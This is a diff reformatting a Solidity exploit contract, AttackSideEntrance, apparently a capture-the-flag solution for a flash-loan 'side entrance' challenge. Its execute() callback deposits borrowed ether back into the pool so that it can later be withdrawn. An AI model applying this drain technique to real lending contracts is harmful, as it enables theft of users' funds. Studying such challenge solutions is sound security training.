@@ -1,9 +1,12 @@
 // SPDX-License-Identifier: MIT
+
 pragma solidity ^0.8.0;
-interface IPool{
-     function flashLoan(uint256 amount) external;
-     function deposit() external payable;
-     function withdraw() external;
+
+
+interface IPool {
+    function flashLoan(uint256 amount) external;
+    function deposit() external payable;
+    function withdraw() external;
 }
 
 contract AttackSideEntrance {
@@ -11,9 +14,9 @@ contract AttackSideEntrance {
     IPool immutable pool;
     address immutable player;
 
-    constructor(address _pool, address _player) {
-        player = _player;
+    constructor(address _pool, address _player){
         pool = IPool(_pool);
+        player = _player;
     }
 
     function attack() external {
@@ -23,9 +26,8 @@ contract AttackSideEntrance {
     }
 
     function execute() external payable {
-
-        require(msg.sender == address(pool), "not pool");
-        require(tx.origin == player, "not player");
+        require(tx.origin == player);
+        require(msg.sender == address(pool));
 
         pool.deposit{value: msg.value}();
     }
